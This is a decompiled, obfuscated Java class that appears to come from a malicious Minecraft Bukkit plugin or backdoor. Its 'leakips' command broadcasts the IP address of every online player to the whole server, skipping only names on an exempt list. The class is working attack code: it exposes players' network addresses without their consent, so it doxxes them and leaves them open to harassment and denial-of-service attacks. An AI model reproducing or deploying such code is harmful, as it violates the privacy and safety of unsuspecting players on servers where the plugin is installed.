/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LeakipsCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIllIIlIllllllIlIllI, String lllllllllllllIllIIlIllllllIllIIl, String[] lllllllllllllIllIIlIllllllIllIII, Player lllllllllllllIllIIlIllllllIlIlll) {
        for (Player lllllllllllllIllIIlIllllllIlllII : Bukkit.getOnlinePlayers()) {
            if (lllllllllllllIllIIlIllllllIlIllI.lite.contains(lllllllllllllIllIIlIllllllIlllII.getName())) continue;
            Bukkit.broadcastMessage((String)Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllIllIIlIllllllIlllII.getName()).append("'s IP: ").append(lllllllllllllIllIIlIllllllIlllII.getAddress().getHostString()))));
        }
    }

    public LeakipsCommand() {
        LeakipsCommand lllllllllllllIllIIlIlllllllIIIIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

